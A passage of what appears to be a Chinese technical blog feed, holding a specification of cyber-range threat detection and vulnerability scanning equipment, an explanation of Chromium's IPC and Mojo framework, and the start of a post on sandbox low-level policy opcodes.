data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7c775f702b08bac8cc9e7fe5550e9e5e.png"></p><p>数据分析与还原功能：靶场定制全流量威胁检测设备支持对NFS协议、QQ协议、HTTP协议、IMAP协议、FTP_DATA协议、SMB协议、POP3协议、SMTP协议、TFTP协议以及WEBMAIL协议的流量进行文件还原，帮助分析人员更好地理解和分析威胁事件，进一步提高威胁检测的准确性和效率。</p><p>流量抓包分析：为了能够根据具体的需求进行抓包分析，提高分析的针对性和有效性，能够自行选择需要的协议类型、端口或IP地址、数量、单向或双向。</p><p>基于网络请求的语义分析检测：通过对网络请求的语义进行分析，能够更准确地判断是否存在恶意行为。且能够从流量中获取响应体、请求体、响应头、请求头四方面详细展示请求内容，并能提升对未知威胁的检测能力。</p><p>告警及传输功能：靶场定制全流量威胁检测设备支持自定义弱口令字典，能够检测IMAP协议、SMTP协议、FTP协议、HTTP协议、Telnet协议、HTTPS协议以及POP协议的自定义弱口令。通过对弱口令的检测，能够及时发现并阻止潜在的安全风险。支持旁路HTTPS解密与威胁检测，通过对HTTPS流量的解密和分析，能够发现潜在的威胁并提供相应的防护措施。支持AES256、SM4数据传输加密。通过对数据传输进行加密，能够防止数据被篡改或泄露，保护系统的安全。</p><p>威胁告警：支持将信息发送给syslog服务器以及kafka服务器，日志信息包括威胁类型、攻击结果、网络日志、威胁告警、威胁等级等。具备集中管理和分析威胁事件的能力，并及时采取相应的防护措施，使传输方式更为多样。</p><p>与云端威胁情报中心联动：靶场定制全流量威胁检测设备支持与云端威胁情报中心联动，能够对文件MD5、IOC/规则ID、攻击IP以及受害IP进行一键搜索，并可通过查看数字证书、域名解析、可视化分析、文件MD5、IOC/规则ID、攻击IP、受害IP以及一键搜索等。通过与云端威胁情报中心的联动，能够及时获取最新的威胁情报，提高威胁检测的准确性和效果。</p><p>还支持对资产漏洞信息以及云端众测平台漏洞情报进行配置展示。以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ebd1f4d9253c1564951e22bcc29023b3.png" alt="表格 描述已自动生成"></p><p>大屏展示与资产分析：靶场定制全流量威胁检测设备支持采用大屏展示整体资产风险态势，包括资产矩形树结构、资产分类、资产概况、开放服务统计、资产风险状态。通过大屏展示，能够全面了解和分析系统的资产状况，及时发现并解决潜在的安全风险。以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6472dc85c1dbedcc909a9bb1b63a329a.png"></p><p>攻击者的维度进行分析：通过对攻击者的分析，能够更好地了解威胁的来源和特征，提高威胁检测的准确性和效率。攻击者进行画像包括：</p><ol><li>地理位置信息</li><li>国家信息</li><li>所属组织</li><li>使用的攻击手段</li><li>攻击的所有资产</li></ol><p>应用系统进行安全检测：通过对应用系统的安全检测，能够发现并修复潜在的安全漏洞和安全威胁，提高系统的安全性。包括的类型有：</p><ol><li>WEB安全</li><li>数据库安全</li><li>中间件安全</li><li>邮件安全</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/240779b180c4717501d5a1143732367e.png"></p><p>DNS相关功能：能够通过自定义域名总长度、请求次数以及时间范围来DNS隧道检测规则。通过对可疑DNS解析的检测，能够发现并阻止潜在的恶意域名的使用，提高系统的安全性。并且能够发现DGA域名与DNS隧道域名。</p><p>疑似DNS服务器发现：通过对DNS服务器的行为进行分析，能够发现并阻止潜在的DNS服务器的使用，提高系统的安全性。可以通过发起DNS请求以及响应DNS请求进行行为分类。</p><p>DNS重绑定分析：支持呈现访问时间、DNS解析记录、域名、攻击IP、受害IP等内容。通过对DNS重绑定的分析，能够发现并阻止潜在的DNS重绑定攻击，提高系统的安全性。</p><p>异常登录行为检测：靶场定制全流量威胁检测设备支持检测异常登录行为，能进行异常时间配置并包括信息：</p><ol><li>源IP</li><li>账号</li><li>登录资产IP</li><li>使用协议</li><li>登录结果</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0c9a9a04e95447b30a98f559b8c57f9f.png"></p><p>明文密码泄露行为检测：靶场定制全流量威胁检测设备支持检测明文密码泄露行为，包括信息：</p><ol><li>登录账号IP</li><li>账号</li><li>密码</li><li>使用协议</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/09e974969db2fb368cde6075dcf0c0e0.png"></p><p>常见数据库高危操作行为分析：靶场定制全流量威胁检测设备支持对下列数据库的高危操作行为进行分析，并能自定义规则：</p><ol><li>mysql数据库</li><li>mssql数据库</li><li>oracle数据库</li><li>sybase数据库</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f703320a11c149d25e79d1f2171683b9.png"></p><p>可疑来源访问行为分析：靶场定制全流量威胁检测设备支持对可疑来源访问行为进行分析，展示下列信息并能自定义可疑来源：</p><ol><li>来源</li><li>源IP</li><li>资产IP</li><li>资产组</li><li>源地域</li><li>目的端口</li><li>URI</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/89445655f91cf3460530ee59ed54bac7.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/89445655f91cf3460530ee59ed54bac7.png"></p><p>告警的深度行为分析：靶场定制全流量威胁检测设备支持告警的深度行为分析，其中包括：</p><ol><li>DNS解析行为</li><li>TCP/UDP交互行为</li><li>WEB访问行为</li><li>传输文件行为</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/20f3cc5d6be5dce311ccdf9c1fd33b62.png"></p><p>受害资产分析：靶场定制全流量威胁检测设备支持以受害资产维度进行分析包括：</p><ol><li>资产分组</li><li>威胁级别</li><li>处于的攻击阶段</li><li>失陷状态</li><li>受到的攻击类型。</li></ol><p>以下是截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/59a0f6a9b26239ae72fda36fd7c1e91d.png"></p><p>攻击者画像分析：靶场定制全流量威胁检测设备支持对攻击者进行画像分析包括信息：</p><ol><li>资产的所有攻击</li><li>使用的攻击手段</li><li>所属组织</li><li>国家信息</li><li>地理位置</li></ol><p>系统安全检测：靶场定制全流量威胁检测设备支持系统安全检测，包括挖矿行为、未授权访问、暴力破解以及弱口令等细分维度。以下是截图证明</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/92b4b9b57d93182f37d8739f8ecbb51c.png"></p><h3 id="靶场定制应用协议威胁特征检测"><a href="#靶场定制应用协议威胁特征检测" class="headerlink" title="靶场定制应用协议威胁特征检测"></a>靶场定制应用协议威胁特征检测</h3><p>功能参数如下：</p><ol><li>内存16G，硬盘1T，以太网千兆管理接口2个，万兆以太网SFP+光接口（含万兆多模光模块）2个，接口扩展槽位3个。</li><li>HTTP吞吐量5Gbps，HTTP并发连接数100万、HTTP每秒新建连接数8万，保护网站站点数量无限制。</li><li>支持透明流模式、透明代理模式、反向代理模式、路由牵引模式、镜像检测模式及镜像阻断模式。</li><li>支持通过BGP方式对流量进行牵引，并在清洗攻击后回注，回注过程支持设置SNAT策略。</li><li>支持静态及动态ARP管理。</li><li>支持HTTP协议校验，可根据实际网络状况自定义协议参数合规标准，过滤非法数据。</li><li>支持设置扫描陷阱，防止恶意扫描。</li><li>支持页面访问顺序规则防护。</li><li>提供流量安全事件与漏洞（CVE/BID/MSB）的对应关系，并支持对应关系的更新。</li><li>提供流量安全事件与弱点（CWE）的对应关系，并支持对应关系的更新。</li><li>提供流量安全事件的可理解描述。</li><li>流量安全事件标识源MAC地址、目的MAC地址、VLAN号。</li></ol><h4 id="方案-1"><a href="#方案-1" class="headerlink" title="方案"></a>方案</h4><p>功能参数设计为，内存16G，硬盘1T，以太网千兆管理接口2个，万兆以太网SFP+光接口（含万兆多模光模块）2个，接口扩展槽位3个。HTTP吞吐量5Gbps，HTTP并发连接数100万、每秒新建连接数8万，无限制保护网站站点数量。支持透明流模式、透明代理模式等多种部署模式。通过BGP方式对流量进行牵引，静态及动态ARP管理。HTTP协议校验，设置扫描陷阱，页面访问顺序规则防护。流量安全事件与漏洞、弱点的对应关系更新，流量安全事件标识。</p><p>设备选择：靶场定制应用协议威胁特征检测设备采用内存容量16GB，硬盘容量1TB。设备支持配备两个千兆以太网管理接口，三个接口扩展槽位以及两个万兆以太网SFP+光接口（包括万兆多模光模块）。</p><p>性能参数：靶场定制应用协议威胁特征检测设备支持无限制的网站站点数量。且HTTP处理速度可达到每秒5G字节。并且HTTP并发连接数不低于100万。同时经过检测，该设备可支持的HTTP每秒新建连接数大于等于8万。</p><p>模式与功能支持：靶场定制应用协议威胁特征检测设备能够通过BGP方式对流量进行牵引，在通过攻击清洗后再将其返回。它还能提供动态ARP管理以及静态ARP管理的功能。还能够支持镜像阻断、镜像检测、路由牵引、透明流、透明代理以及反向代理模式。并且在回注的过程中，可以配置SNAT策略。</p><p>协议校验与防护：靶场定制应用协议威胁特征检测设备能够设置扫描陷阱，以防止恶意扫描。还能够进行HTTP协议校验，用户可以自定义协议参数要求合规标准，并过滤非法数据。此外还能够进行页面访问顺序规则防护。</p><p>安全事件与漏洞对应关系：靶场定制应用协议威胁特征检测设备提供流量安全事件与漏洞的对应关系，其中包括了CVE漏洞编号、BID漏洞编号以及MSB漏洞编号。除此之外，该系统还能够给出流量安全事件与弱点，也就是CWE编号的对应关系，提供对流量安全事件的的清晰描述，并且这些对应关系都能够实时更新。</p><p>流量安全事件标识：靶场定制应用协议威胁特征检测设备支持识别流量中的安全事件，并给出安全事件的VLAN号、目的MAC地址以及源MAC地址等标识信息。</p><h3 id="靶场定制多层协议异常特征检测"><a href="#靶场定制多层协议异常特征检测" class="headerlink" title="靶场定制多层协议异常特征检测"></a>靶场定制多层协议异常特征检测</h3><p>功能参数如下：</p><ol><li>配置千兆电口8个，千兆光口8个，万兆光口8个，设备扩展槽位5个，支持40G光接口扩展。</li><li>配置2块 480GB SSD硬盘，2块可插拔模块化交流电源，2块可插拔模块化风扇。</li><li>整机应用层吞吐量（全威胁应用层吞吐）15Gbps，并发连接数1500万，新建连接数20万/秒；</li><li>配置虚拟授权数量16，配置全接口防护授权，支持路由模式、透明模式、混合模式部署。</li><li>攻击特征库数量8000、病毒特征库数量600W、支持的协议识别数量5500。</li><li>支持病毒检测功能，集成第三方专业防病毒厂商的专业病毒库。</li><li>支持IPv6协议，支持基于IPv6的流量威胁识别功能；特征库支持手动、自动升级两种方式。</li><li>支持报文示踪功能，支持真实流量、导入报文、构造报文三种模式进行失踪诊断，支持报文捕获，并支持以cap包导出供其他系统分析。</li><li>提供流量安全事件与漏洞（CVE/BID/MSB）的对应关系，并支持对应关系的更新。</li><li>提供流量安全事件与弱点（CWE）的对应关系，并支持对应关系的更新。</li><li>提供流量安全事件的可理解描述。</li><li>流量安全事件标识源MAC地址、目的MAC地址、VLAN号。</li></ol><h4 id="方案-2"><a href="#方案-2" class="headerlink" title="方案"></a>方案</h4><p>功能参数设计为，配置千兆电口8个，千兆光口8个，万兆光口8个，设备扩展槽位5个，支持40G光接口扩展。配置2块480GB SSD硬盘，2块可插拔模块化交流电源，2块可插拔模块化风扇。整机应用层吞吐量15Gbps，支持并发连接数1500万，新建连接数20万/秒。虚拟授权数量16，全接口防护授权。攻击特征库数量8000，病毒特征库数量600W。支持病毒检测功能，IPv6协议支持。报文示踪功能。流量安全事件与漏洞、弱点的对应关系更新。</p><p>硬件配置：配备了八个万兆光口、八个千兆电口以及八个千兆光口，同时还具备五个可扩展设备槽位，拥有四十个G光接口扩展。其配置还包括两块480GB SSD硬盘，支持灵活扩容，以满足数据存储需求。此外，该设备还搭载了两块可以轻松更换的模块化交流电源和两块可插拔的模块化风扇，以增强系统的可维护性和稳定性。</p><p>性能要求：靶场定制多层协议异常特征检测设备应用层吞吐量（全威胁应用层吞吐）大于15Gbps，满足高吞吐量的数据采集需求。并发连接不低于1500万，新建连接数支持不少于20万/秒，设备满足对大量并发连接的负载及处理。</p><p>授权与防护：靶场定制多层协议异常特征检测设备配置虚拟授权数量不低于16个，并提供全接口防护授权，以确保系统的安全性和可靠性。</p><p>部署模式：支持混合模式部署、透明模式部署以及路由模式部署，以适应各种网络环境。</p><p>特征库与病毒检测：靶场定制多层协议异常特征检测设备拥有超过600万个病毒特征库以及8000个以上的攻击特征库，以提供全面的安全防护能力。同时可以对接第三方病毒库，如专业防病毒厂商，集成操作步骤简便，使设备的专业的病毒检测功能更加完善。</p><p>升级方式：支持手动、自动升级两种方式，以确保特征库的及时更新。</p><p>IPv6支持与报文分析：靶场定制多层协议异常特征检测设备具备通过IPv6的流量进行威胁识别功能，以适应不同网络环境的需求。具备报文示踪功能，失踪诊断可以通过构造报文、导入报文以及真实流量这几种模式来诊断。还能够进行以cap包格式导出捕获的报文，以方便流量分析和安全事件的识别。</p><p>安全事件与漏洞对应关系：靶场定制多层协议异常特征检测设备支持查看流量安全事件与漏洞的对应关系，其中漏洞包括了CVE漏洞编号、BID漏洞编号以及MSB漏洞编号，并支持对应关系的更新，以提供全面的安全事件识别和漏洞管理能力。</p><p>安全事件描述：靶场定制多层协议异常特征检测设备提供流量安全事件的可理解描述，以便用户能够更好地理解和处理安全事件。</p><h3 id="靶场定制漏洞特征采集"><a href="#靶场定制漏洞特征采集" class="headerlink" title="靶场定制漏洞特征采集"></a>靶场定制漏洞特征采集</h3><p>功能参数如下：</p><ol><li>1U高机架式硬件架构，8G内存，2T硬盘，配置6个以太网千兆电口，支持1个接口扩展槽位。</li><li>最大可扫描128~1024个IP地址，配置128个IP地址或域名授权。</li><li>系统支持国产操作系统、数据库的扫描，国产操作系统包含中标麒麟、凝思、华为欧拉、深度、XXXX，国产数据库包括神通、人大金仓、南大通用、达梦。</li><li>系统支持自适应网络扫描，根据网络状况自动调整发包速率，减少对用户网络的影响。</li><li>系统支持和微软WSUS补丁系统联动，方便进行自动化的补丁修补。</li><li>系统支持自带诊断工具，包含PING、Traceroute、端口探测、Tcpdump抓包、故障信息收集、一键诊断，方便用户快速定位问题。</li></ol><h4 id="方案-3"><a href="#方案-3" class="headerlink" title="方案"></a>方案</h4><p>功能参数设计为，1U高机架式硬件架构，8G内存，2T硬盘，6个以太网千兆电口，1个接口扩展槽位。可扫描128~1024个IP地址，配置128个IP地址或域名授权。支持国产操作系统、数据库扫描。自适应网络扫描，微软WSUS补丁系统联动。自带诊断工具，方便快速定位问题。</p><p>硬件配置：靶场定制漏洞特征采集设备采用1U高的机架式硬件架构，硬盘容量配置不低于2T，内存配置大于等于8G，该设备完全满足数据存储需求。并且配置了6个以太网千兆电口，并且具备1个可扩展的接口槽。</p><p>扫描能力与授权：靶场定制漏洞特征采集设备最大可扫描128~1024个IP地址，提供灵活的IP地址范围配置。可配置不少于128个IP地址或域名授权，以满足对目标网络的全面扫描需求。</p><p>国产操作系统与数据库支持：靶场定制漏洞特征采集设备可用于扫描国产操作系统，涵盖了XXXX操作系统、深度操作系统、中标麒麟操作系统、凝思操作系统以及华为欧拉操作系统。还支持扫描数据库，涵盖了达梦、南大通用、神通和人大金仓等数据库</p><p>自适应网络扫描与补丁联动：靶场定制漏洞特征采集设备支持自适应网络扫描功能，可以通过智能的调整发包频率，从而降低对用户网络的影响。此外，它还兼容微软WSUS补丁系统，使得补丁修复能够自动进行，从而增进系统的整体安全性。</p><p>自带诊断工具：靶场专用漏洞特征采集设备内置了一套诊断工具，涵盖了一键诊断功能、Traceroute工具、Tcpdump抓包功端口探测工具、故障信息收集功能以及PING工具等功能，以方便用户快速定位和解决问题。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Chromium IPC</title>
      <link href="posts/42c3081f/"/>
      <url>posts/42c3081f/</url>
      
        <content type="html"><![CDATA[<h1 id="IPC-Overview"><a href="#IPC-Overview" class="headerlink" title="IPC Overview"></a>IPC Overview</h1><p>由于 Chromium 是多进程架构，这就意味着各个进程之间需要互相通信进行消息同步，主要的原始通信手段便是管道。每个renderer 进程都有一个管道，用来和 borwser 进行通信。管道以异步模式使用，以确保任何一端在等待另一端时都不会被阻塞。</p><p>注意：所有的网络通信都是由浏览器的主进程来处理的。</p><p>在 chromium 的多进程架构下可以分为 3 层看，最底层是 <code>Blink</code>，是负责渲染页面的引擎。中间层是<code>Renderer</code>，每个标签页都含有一个 renderer，每个 renderer 进程都有一个 Blink 实例。最顶层是浏览器进程，管理所有的 renderer，控制所有的网络访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804104619.png"></p><h2 id="IPC-in-the-browser"><a href="#IPC-in-the-browser" class="headerlink" title="IPC in the browser"></a>IPC in the browser</h2><ul><li><p>浏览器与渲染器的通信是在一个单独的 I/O 线程中完成的。</p></li><li><p>浏览器与 views 的通信，必须由<code>ChannelProxy</code>代理转发到主线程。如此，例如网页资源请求这种最常见、关系性能的信息可以在 I/O 线程上处理，而不会阻塞用户界面。</p></li><li><p>这些是通过使用由 RenderProcessHost 插入到通道中的 ChannelProxy::MessageFilter 来完成的</p></li><li><p><code>ChannelProxy::MessageFilter</code>在 I/O 线程中运行，拦截资源请求消息，并将其直接转发给资源调度程序主机(resource dispatcher host)</p></li></ul><h2 id="IPC-in-the-renderer"><a href="#IPC-in-the-renderer" class="headerlink" title="IPC in the renderer"></a>IPC in the renderer</h2><ul><li><p>每个 renderer 都有一个单独的线程来管理通信，另一个线程来完成渲染和其他操作处理。</p></li><li><p>大多数消息通过主渲染器线程从浏览器发送到WebKit线程，反之亦然。这个额外的线程是为了支持同步 renderer-to-browser 消息。</p></li></ul><h2 id="Types-of-messages"><a href="#Types-of-messages" class="headerlink" title="Types of messages"></a>Types of messages</h2><p>Chromium 的消息类别主要有两种： <code>routed</code> <code>control</code>。</p><p>Control messages 由创建管道的类处理。有时，该类将允许其他<code>listeners</code>通过 MessageRouter 对象接收消息，其他 listeners 可以注册该对象，并接收使用其唯一id发送的 <code>routed</code> 消息。</p><p>Routed messages 用于将消息发送到特定的 RenderViewHost。不过从技术上讲，任何类都可以通过使用 <code>RenderProcessHost::GetNextRoutingID</code> 接收路由消息，并通过调用<code>RenderProcessHost::AddRoute</code> 注册自己。目前，RenderViewHost 和 RenderFrameHost 实例都有自己的路由 id。</p><p>浏览器和渲染器之间的通信是和消息类型无关的，从浏览器发送到渲染器的与 document’s frame 相关的消息称为 frame 消息，它们被发送到 RenderFrame。类似的，从渲染器发送到浏览器的消息称为FrameHost消息，它们被发送到 RenderFrameHost。</p><p>插件也有独立的进程。像渲染消息一样，有 PluginProcess 消息(从浏览器发送到插件进程)和 PluginProcessHost 消息(从插件进程发送到浏览器)。</p><h1 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h1><p>在新的文档？发现这样一句话， **Legacy IPC is deprecated.**所以原文档后面的一些关于 messages 的处理和声明部分便没有继续观看。在网上找到<a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&IPC/">一篇总结很好的文章</a>，这里引用一下。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Mojo 是一个跨平台 IPC 框架，它诞生于 chromium ，用来实现 chromium 进程内/进程间的通信。目前，它也被用于 ChromeOS。</p><p>Mojo 系统 API 提供了一套低等级的 IPC 原语：<strong>message pipes</strong>, <strong>data pipes</strong>,  <strong>shared buffers</strong>.</p><p>关于message pipes：消息管道是一种轻量级原语，用于双向传输相对较小的数据包。该管道有两个端点，任意一个端点都可以通过另一个消息管道进行传输。因为浏览器进程和每个子进程之间都存在一个原始的消息管道，用户同样可以创建一个新管道并且发送数据到任意进程的任意的管道的任意一端，并且该通道两端可以无缝独占互相通信。</p><h2 id="mojo-术语"><a href="#mojo-术语" class="headerlink" title="mojo 术语"></a>mojo 术语</h2><ul><li><strong>Message Pipe</strong>: 每个消息管道都有两个端点，一对端点和任一端点可以通过另一个消息管道来传输信息。因为浏览器进程和每个子进程之间引导了一个原始消息管道，这意味着我们创建的新管道将任一端发送到任何进程，并且两端仍然能够无缝且排他地相互通信。</li><li><strong>Mojom file</strong>: 定义接口，它们是强类型的消息集合。 每个接口消息大致类似于单个原型消息</li><li><strong>Remote</strong>: 通过接口发送信息数据</li><li><strong>Receiver</strong>: 用于接收<strong>Remote</strong>发送的接口消息</li><li><strong>PendingRemote</strong>: 用于容纳 Receiver 管道另一端的类型化容器。</li><li><strong>PendingReceiver</strong>: 用于容纳 Remote 管道另一端的类型化容器。</li><li><strong>AssociatedRemote/Receiver</strong>: 类似于遥控器和接收器。 但是，它们在单个消息管道上的多个接口上运行，同时保留消息顺序，因为 AssociatedRemote/Receiver 是通过使用传统 IPC 消息使用的 IPC::Channel 实现的。</li></ul><h2 id="mojo-架构"><a href="#mojo-架构" class="headerlink" title="mojo 架构"></a>mojo 架构</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142536.png"></p><ul><li><strong>Mojo Core：</strong>mojo 的核心层(由 C++ 实现).每个使用Mojo进行进程间通信的进程被称之为Mojo embedder，这个进程需要链接 Core代码。Mojo Core 针对不同的系统实现具体IPC通信机制。</li><li><strong>Mojo System API(C):</strong> Mojo 的公共的 C 语言 API 合集，mojo 初始化完成后，任意进程可调用。但该API几乎不会直接调用，它是构建更高级别Mojo API的基础。它提供了消息管道，数据管道，共享buffer等创建及交互的Mojo API，以及进程间的引导连接API。</li><li><strong>Mojo System API(C++/Java/JS)：</strong>Mojo 的各种语言包装层，它将 Mojo C API 包装成多种语言的库，让其他语言可以使用。</li><li><strong>Mojo Bindings：</strong>这一层引入一种称为 Mojom 的 IDL（接口定义）语言，通过它可以定义通信接口，这些接口会生成接口类，使用户只要实现这些接口就可以使用 Mojo 进行通信，这一层使得IPC两端不需要通过原始字节流进行通信，而是通过接口进行通信。</li></ul><p>除了上面提到的那些层之外，在 Chromium 中还有2个模块对 Mojo 进行了包装，分别是 Services(//services) 模块和 IPC(//ipc) 模块。</p><ol><li><code>Services</code>: 一种更高层次的IPC机制，构建于Mojo之上，以<code>Service</code>的级别来进行IPC通信，Chromium大量使用这种IPC机制来包装各种服务，用来取代 <code>Legacy Chrome IPC</code>，比如device服务，preferences服务，audio服务，viz服务等。</li><li><code>Legacy Chrome IPC</code>: 已经不推荐使用的Chrome IPC机制，提供 <code>IPC::Channel</code> 接口以及大量的使用宏来定义的 messages 类。目前它底层也是基于 Mojo 来实现的，但是上层接口和旧的 Chrome IPC 保持一致。chromium 中还有很多IPC使用这种方式，但是不应该在新的服务中使用这种机制。可以在<a href="https://source.chromium.org/chromium/chromium/src/+/master:ipc/ipc_message_start.h;bpv=1;bpt=0">ipc/ipc_message_start.h</a>中查看还有哪些部分在使用这种IPC机制。</li></ol><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>Mojo 支持在<strong>多个</strong>进程之间互相通信，这一点和其他的IPC有很大不同，其他大多只支持2个进程之间进行通信。由Mojo组成的这些可以互相通信的进程就形成了一个网络，在这个网络内的任意两个进程都可以进行通信，并且每个进程只能处于一个Mojo网络中，在这个网络内每一个进程内部有且只有一个<code>Node</code>,每一个<code>Node</code>可以提供多个<code>Port</code>，每个<code>Port</code>对应一种服务，这点类似TCP/IP中的IP地址和端口的关系。一个<code>Node:Port</code>对可以唯一确定一个服务。<code>Node</code>和<code>Node</code>之间通过<code>Channel</code>来实现通信，在不同平台上<code>Channel</code>有不同的实现方式，在Linux上是domain socket,在windows上是name pipe，在MAC OS平台上是 Mach Port。在Port上一层，Mojo封装了3个“应用层协议”，分别为<code>MessagePipe</code>，<code>DataPipe</code>和<code>SharedBuffer</code>（类似在TCP上封装了HTTP，SMTP等）。整体结构如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142004.png"></p><p>上图展示了在两个进程间使用Mojo的数据流。它有以下几个特点：</p><ol><li><code>Channel</code>: Mojo内部的实现细节，对外不可见，用于包装系统底层的通信通道，在Linux下是domain socket,Windows下是name pipe，MAC OS下是mach port；</li><li><code>Node</code>: 每个进程只有一个Node，它在Mojo中的作用相当于TCP/IP中的IP地址，同样是内部实现细节，对外不可见；</li><li><code>Port</code>: 每个进程可以有上百万个Port，它在Mojo中的作用相当于TCP/IP中的端口，同样是内部实现细节，对外不可见，每个Port都必定会对应一种应用层接口，目前Mojo支持三种应用层接口；</li><li><code>MessagePipe</code>: 应用层接口，用于进程间的<strong>双向</strong>通信，类似UDP,消息是基于数据包的，底层使用Channel通道；</li><li><code>DataPipe</code>: 应用层接口，用于进程间<strong>单向</strong>块数据传递，类似TCP,消息是基于数据流的，底层使用系统的Shared Memory实现；</li><li><code>SharedBuffer</code>: 应用层接口，支持<strong>双向</strong>块数据传递，底层使用系统Shared Memory实现；</li><li><code>MojoHandle</code>： 所有的 MessagePipe,DataPipe,SharedBuffer 都使用MojoHandle来包装，有了这个Hanle就可以对它们进行读写操作。还可以通过MessagePipe将MojoHandle发送到网络中的任意进程。</li><li><a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/platform/platform_handle.h;drc=b64eedb9d23e0350557a9bb22c9217ae52cd82c3;bpv=1;bpt=1;l=42"><code>PlatformHanle</code></a>: 用来包装系统的句柄或文件描述符，可以将它转换为MojoHandle然后发送到网络中的任意进程</li></ol><h3 id="MessagePipe"><a href="#MessagePipe" class="headerlink" title="MessagePipe"></a>MessagePipe</h3><p>一个进程中可以有N多个MessagePipe，所有的MessagePipe都共享底层的一条通信通道，就像下图这样：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142007.png"></p><blockquote><p>需要特别说明的是，Mojo不是只能在不同进程间使用，它从一开始就考虑了在单进程中使用的场景，并且有专门的优化，因此，使用Mojo带来的一个额外好处是，在Mojo的一端进行读写不必知道另一端是运行在当前进程还是外部进程，这非常有利于将单进程程序逐步的使用Mojo拆分为多进程程序，并且可以在调试的时候使用单进程方便调试，在正式环境中使用多进程缩小程序崩溃时的影响范围</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="http://dev.chromium.org/developers/design-documents/multi-process-resource-loading">http://dev.chromium.org/developers/design-documents/multi-process-resource-loading</a></p><p>[2] <a href="https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md">https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md</a></p><p>[3] <a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/">https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/</a></p><p>[4] <a href="https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/">https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> IPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sandbox low-level-policy</title>
      <link href="posts/28399a6/"/>
      <url>posts/28399a6/</url>
      
        <content type="html"><![CDATA[<h1 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h1><h2 id="Opcode-1"><a href="#Opcode-1" class="headerlink" title="Opcode"></a>Opcode</h2><p>低级策略(low-level-policy)是使用策略“操作码”的概念实现的。操作码是一种包含足够信息的结构，可以对单个输入参数执行一次比较，下面给出了几个比较的范例：</p><ul><li>Is input parameter 3 not equal to nullptr?</li><li>Does input parameter 2 start with L”c:\“?</li><li>Is input parameter 5, bit 3 is equal 1?</li></ul><p>每个操作码实际上相当于一个函数调用，但操作码知道原函数的参数的个数是 原函数的参数个数-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool fn(a, b, c, d)  with 4 arguments</span><br><span class="line">Then an opcode is: op(fn, b, c, d)</span><br><span class="line"></span><br><span class="line">关于操作码评估：</span><br><span class="line">op.eval(a)  ------------------------&gt; fn(a,b,c,d)</span><br><span class="line">                internally calls</span><br><span class="line">                </span><br><span class="line">评估是在具有N个比较操作码加1个动作操作码的操作码组中进行的。 </span><br><span class="line"></span><br><span class="line">[comparison 1][comparison 2]...[comparison N][action][comparison 1]...</span><br><span class="line">   ----- evaluation 